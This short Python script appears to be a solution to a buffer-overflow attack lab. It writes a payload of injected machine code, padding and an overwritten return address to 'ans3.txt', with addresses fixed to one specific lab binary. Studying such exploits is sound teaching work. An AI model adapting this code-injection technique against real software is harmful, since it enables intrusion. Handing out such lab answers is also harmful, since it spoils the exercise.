code = b"\xbf\x72\x00\x00\x00\xb8\x16\x12\x40\x00\xff\xd0"
padding = b"A"*28
ret_addr = b"\x34\x13\x40\x00\x00\x00\x00\x00" #address of jmp_xs
payload = code+padding+ret_addr
with open("ans3.txt","wb") as f:
    f.write(payload)
print("Payload written to ans3.txt")
